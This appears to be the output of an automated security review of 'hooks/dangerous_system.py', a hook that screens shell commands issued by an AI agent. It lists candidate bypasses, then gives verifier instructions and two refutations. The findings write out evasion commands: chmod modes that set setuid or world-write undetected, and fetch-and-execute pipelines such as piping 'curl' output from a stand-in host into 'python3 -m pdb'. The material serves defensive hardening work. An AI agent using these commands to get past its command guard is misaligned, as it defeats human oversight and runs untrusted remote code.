[
  {
    "filePath": "hooks/dangerous_system.py",
    "category": "parser-differential",
    "vulnerableCode": "_SETUID = re.compile(r\"^(?:[4267][0-7]{3}|[ugoa]*\\+[rwxX]*s)\")\n...\ndef _mode_matches(pattern, mode):\n    return any(pattern.match(clause) for clause in mode.split(\",\"))",
    "explanation": "The new `_mode_matches` is meant to check every clause of a symbolic mode, but it only splits on commas. chmod's grammar lets one clause hold several actions (`[ugoa]*([-+=][perms])+`) and also has the `=` operator. The regexes only accept `who` followed directly by `+`. So `chmod u-x+s /usr/local/bin/x` and `chmod u=rwxs /usr/local/bin/x` set setuid but are not flagged as chmod-dangerous. Likewise `chmod -R o-x+w /etc` and `chmod -R a=rwx /` make files world-writable and do not match _WORLD_WRITABLE. That leaves only the generic recursive-on-broad-target rule, and nothing catches non-recursive world-writable chmod on a single broad target such as `chmod o-r+w /etc` or `chmod a=rwx /etc`. Zero-padded octal also slips through: `chmod 04755 file` does not match `[4267][0-7]{3}`. This is the differential: the validator rejects the mode as harmless while chmod applies setuid or world-write.",
    "fix": "Parse each comma-separated clause as `who` followed by one or more (op, perms) actions and check every action whose op is `+` or `=`. Flag `s` for setuid/setgid. Flag `w` when who includes o or a, or when who is empty. For octal modes, strip leading zeros (or use int(mode, 8)) and test the bits (mode & 0o6000, mode & 0o002).",
    "severity": "medium",
    "confidence": 0.7,
    "_diff_anchor": "in_diff"
  },
  {
    "filePath": "hooks/dangerous_system.py",
    "category": "fail-open",
    "vulnerableCode": "inspect = dict(command.environment).get(\"PYTHONINSPECT\", ())\nreturn \"i\" in flags or any(inspect)",
    "explanation": "`environment` holds the values a variable *may* have, and the model returns () when the value is computed at run time or unknown (see SimpleCommand.env_values: \"() if unknown\"). `_inspects` treats an empty tuple as \"not set\", so the check fails open. Python turns on inspect mode for any non-empty PYTHONINSPECT, but this check only catches literal values it can see. For example, `curl -s https://x/y.py | PYTHONINSPECT=$(printf 1) python3 -m json.tool a.json`, or `X=1; ... | PYTHONINSPECT=\"$X$Y\" python3 -m json.tool a.json`, gets an unknown value. The check returns False, the json.tool data-module exemption applies, and the command is allowed. Python then runs the fetched stdin as code once json.tool finishes. This is the same fetch-and-execute bypass that the new rule was added to block.",
    "fix": "Fail closed. If PYTHONINSPECT is present in the environment with unknown or computed values, treat it as set. Deny unless every possible value is known to be empty. Only skip the check when -E or -I is among the flags.",
    "severity": "medium",
    "confidence": 0.55,
    "_diff_anchor": "in_diff"
  },
  {
    "filePath": "hooks/dangerous_system.py",
    "category": "allowlist-semantic-escape",
    "vulnerableCode": "rest = operands(module_args)\nreturn module not in _STDIN_DATA_MODULES and (not rest or rest[0] in STDIN_PATHS)",
    "explanation": "Any module whose first operand is not a stdin path is treated as not running stdin. That assumption is wrong for modules that read code or commands from stdin while also taking a file operand. For example, `curl -s https://x/y.py | python3 -m pdb local.py` gets rest=['local.py'] and is allowed. pdb then reads debugger commands from the piped stdin, and commands such as `!__import__('os').system(...)` or `interact` run arbitrary Python from the fetched payload. The rewritten branch also strips module flags with operands() and has no table of options that take values, so `-m mod --opt value` is read as having the file operand `value`.",
    "fix": "Use a denylist of modules that execute stdin even when given operands (pdb, code, asyncio, IPython, ...) and deny those whenever stdin comes from a fetcher. Better still, deny by default and allow only modules known to read stdin as data.",
    "severity": "medium",
    "confidence": 0.5,
    "_diff_anchor": "in_diff"
  },
  {
    "filePath": "hooks/dangerous_system.py",
    "category": "parser-differential",
    "vulnerableCode": "if arg in (\"-\", \"--\") or not arg.startswith(\"-\"):\n    break\nif arg.startswith(\"--\"):\n    continue",
    "explanation": "`_python_options` treats every long option as taking no value. CPython's `--check-hash-based-pycs` takes the next argv word as its value. In `curl -s URL | python3 --check-hash-based-pycs always`, the parser stops at `always` and finds no module and no `-i`. The fallback `operands(args, ...)` then treats `always` as the script, so `_executes_stdin` returns False. Python itself consumes `always` as the option's value and executes stdin as code, which defeats the fetch-and-execute and decode-and-execute rules. Combinations such as `python3 --check-hash-based-pycs never -i -m json.tool a.json` also hide the newly handled `-i` flag. The flaw sits in the option loop that this change rewrote.",
    "fix": "Treat `--check-hash-based-pycs` (and any other value-taking long option) as consuming the next argument in both `_python_options` and the generic interpreter operands set. Better still, fail closed on long options the parser does not recognise.",
    "severity": "medium",
    "confidence": 0.55,
    "_diff_anchor": "off_diff"
  }

REFUTE if the only victim is the attacker themselves on their own machine. KEEP if the attacker is a legitimate user/tenant but the impact reaches other users/tenants, shared infra, or server-side resources.

DIFF-ANCHOR: candidates are sorted `in_diff` first, then `off_diff`. Process them in order. `in_diff` candidates use the standard KEEP/REFUTE bar above. `off_diff` candidates require STRICTER evidence: you must identify the specific +/- line in the diff that ENABLES the off-diff sink (a removed guard, a new caller, a changed argument feeding it). If you cannot name that enabling diff line, REFUTE the off_diff candidate. Additionally, REFUTE any off_diff candidate whose sink is already covered by a surviving in_diff candidate.

Then Read the cited file and refute with cited file:line evidence if ANY of these holds:
- PRE-EXISTING: the cited vulnerableCode does NOT appear on any + line in the DIFF block above — it is unchanged context in a touched file. The diff did not introduce it.
- A sanitizer/validator/authz check prevents the described exploit.
- The sink is non-dangerous: typed-schema decoder (msgspec/pydantic, not pickle/yaml), hardcoded https://<host>/ URL with non-:path params, autogen client stub, value is statically number/boolean.
- NO PRIVILEGE BOUNDARY: attacker == victim. The input comes from env var / CLI arg / $HOME dotfile / HKCU / ~/Library prefs / OS-user config — and the process runs at the same privilege as whoever writes that source. Also: the 'allow' decision is advisory self-gating returned to the same caller; or the prefix/suffix check is a secondary filter behind a parent-domain pin.
  NEVER apply NO-PRIVILEGE-BOUNDARY to: SSRF/outbound-network sinks; LLM-agent capability gates (PreToolUse/PostToolUse hooks, bash allow/denylists, workspace path jails — the model is the attacker, the user is the victim); data-exposure findings (CWE-200/359/532, secrets-in-logs — the question is who READS the sink, not who controls the input); project-working-directory config (.claude/settings, .vscode/, package.json scripts — repo author ≠ repo cloner); cross-process metadata sources (psutil.Process(...), /proc/<pid>/* — different process owner is a different principal).
- TRUSTED-HEADER NAMESPACE: the flagged header is from a namespace the same handler already trusts for actor identity/authz (e.g. control-plane-injected X-Amzn-*).
- FRONTEND-ONLY GATE: the loosened check is in frontend code AND the backend handler independently enforces it.
- DELEGATED VALIDATION: the unvalidated credential is immediately forwarded to an upstream that validates.
- THROWAWAY-CODE: all touched files live under scripts/, dev/, tools/, examples/, testdata/, fixtures/, or behind a __main__ dev guard.
- CONTROL MOVED TO LIBRARY: the diff removes a security control AND bumps a dependency that documents providing that control — the control was delegated, not removed.
- Config/feature-flag gates the path with no per-request user control over the gate value.
- Protective-control polarity: the change loosens a guard around a PROTECTIVE control (prompt/audit/confirm).
Do NOT speculate — refute only with cited evidence. Default = SURVIVES.

Return `survived` — the indices of candidates you could NOT refute — and `refuted` — {idx, reason} records for each you did. An empty `survived` means every candidate was refuted.

refuted.reason: The fail-open premise is wrong. shell_expand.py:4-5 says 'What stays unknown stays as written and marks the word dynamic'. So a computed value such as PYTHONINSPECT=$(cmd) or "$X$Y" is stored as a non-empty literal string, e.g. '$(cmd)'. shell_model.py:326-351 stores the expanded text as the value. `$(printf 1)` itself is evaluated to '1' (shell_expand.py:378). In each case any(inspect) is True and the command is denied. The environment tuple is () only when PYTHONINSPECT is not assigned anywhere on the line, so the described bypass does not occur.

This is off_diff and no diff line enables it. The `if arg.startswith("--"): continue` handling is unchanged context. Before the diff, `python3 --check-hash-based-pycs always` also hit `always`: _python_module returned None and the generic operands() fallback treated `always` as the script. Behaviour is identical now. The diff only changed `return None` to `break`, and it did not make the generic fallback any weaker. Hiding `-i` behind this option is not a regression either, because `-i` was not detected at all before the diff.
